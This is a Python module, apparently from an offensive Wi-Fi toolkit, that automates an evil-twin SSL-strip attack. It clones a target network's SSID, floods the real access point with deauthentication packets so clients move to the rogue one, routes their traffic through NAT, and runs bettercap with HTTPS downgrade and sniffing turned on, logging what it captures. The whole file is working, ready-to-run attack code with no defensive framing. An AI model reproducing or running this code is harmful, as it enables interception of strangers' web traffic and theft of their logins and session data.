# attacks/ssl_strip.py

import subprocess
import time
import os
from typing import Optional
from termcolor import colored
from .base import BaseAttack
from utils.helpers import run_in_new_terminal

class SSLStripAttack(BaseAttack):
    def __init__(self, monitor_interface: str, target_bssid: str, target_ssid: str, target_channel: str):
        super().__init__(monitor_interface)
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = str(target_channel)
        self.ap_proc = None
        self.dnsmasq_proc = None
        self.deauth_proc = None

    def _execute(self):
        print(colored("\n" + "="*60, "yellow", attrs=['bold']))
        print(colored("    🍋 SSL STRIP / HTTPS DOWNGRADE ATTACK 🍋", "yellow", attrs=['bold']))
        print(colored("="*60, "yellow", attrs=['bold']))

        try:
            # 1. Enable IP Forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

            # 2. Start Rogue AP
            print(colored("[*] Step 1: Launching Rogue AP...", "cyan"))
            ap_cmd = ["airbase-ng", "-e", self.target_ssid, "-c", self.target_channel, self.monitor_interface]
            self.ap_proc = subprocess.Popen(ap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(5)
            subprocess.run(["ip", "link", "set", "at0", "up"], capture_output=True)
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", "at0"], capture_output=True)

            # 3. Enable Internet Sharing (NAT) - THE MISSING STEP
            internet_iface = self._find_internet_interface()
            if internet_iface:
                print(colored(f"[*] Step 2: Sharing internet from {internet_iface} to at0...", "green"))
                # Flush old rules and setup NAT
                subprocess.run(["iptables", "-F"], capture_output=True)
                subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
                subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", internet_iface, "-j", "MASQUERADE"], capture_output=True)
                subprocess.run(["iptables", "-A", "FORWARD", "-i", "at0", "-o", internet_iface, "-j", "ACCEPT"], capture_output=True)
                subprocess.run(["iptables", "-A", "FORWARD", "-m", "state", "--state", "ESTABLISHED,RELATED", "-j", "ACCEPT"], capture_output=True)
            else:
                print(colored("[!] Warning: No internet-facing interface detected. Clients will have no internet.", "yellow"))

            # 4. Start DHCP Server
            print(colored("[*] Step 3: Starting DHCP server (dnsmasq)...", "cyan"))
            subprocess.run(["pkill", "dnsmasq"], capture_output=True)
            dns_cmd = [
                "dnsmasq", "-i", "at0", "--dhcp-range=10.0.0.10,10.0.0.250,12h",
                "--dhcp-option=3,10.0.0.1", "--dhcp-option=6,8.8.8.8", "-d"
            ]
            self.dnsmasq_proc = subprocess.Popen(dns_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 5. Start Background Deauth
            print(colored(f"[*] Step 4: Launching Deauth against {self.target_bssid}...", "red"))
            deauth_cmd = ["aireplay-ng", "--deauth", "0", "-a", self.target_bssid, self.monitor_interface]
            self.deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 6. Launch Bettercap
            print(colored("[*] Step 5: Launching Bettercap MitM engine...", "cyan"))
            bettercap_cmds = [
                "set http.proxy.sslstrip true",
                "set net.sniff.verbose true",
                "set events.stream.output /temp/logs/rubyfi_mitm.log", # Saves data here
                "http.proxy on",
                "net.sniff on"
            ]
            bettercap_eval = "; ".join(bettercap_cmds)
            bettercap_cmd = f"bettercap -iface at0 -eval '{bettercap_eval}'"
            run_in_new_terminal(bettercap_cmd)

            print(colored("\n" + "═"*60, "green", attrs=['bold']))
            print(colored("    ✓ ATTACK FULLY ACTIVE!", "green", attrs=['bold']))
            print(colored("═"*60, "green", attrs=['bold']))
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            pass
        finally:
            self._cleanup()

    def _find_internet_interface(self) -> Optional[str]:
        """Find the interface that has internet connection."""
        try:
            result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
            if result.returncode == 0 and result.stdout:
                parts = result.stdout.split()
                if "dev" in parts:
                    return parts[parts.index("dev") + 1]
        except:
            pass
        return None

    def _cleanup(self):
        print(colored("\n[*] Cleaning up SSL Strip environment...", "cyan"))
        if self.ap_proc: self.ap_proc.terminate()
        if self.dnsmasq_proc: self.dnsmasq_proc.terminate()
        if self.deauth_proc: self.deauth_proc.terminate()
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["pkill", "bettercap"], capture_output=True)
        subprocess.run(["pkill", "airbase-ng"], capture_output=True)
        subprocess.run(["pkill", "aireplay-ng"], capture_output=True)
        subprocess.run(["pkill", "dnsmasq"], capture_output=True)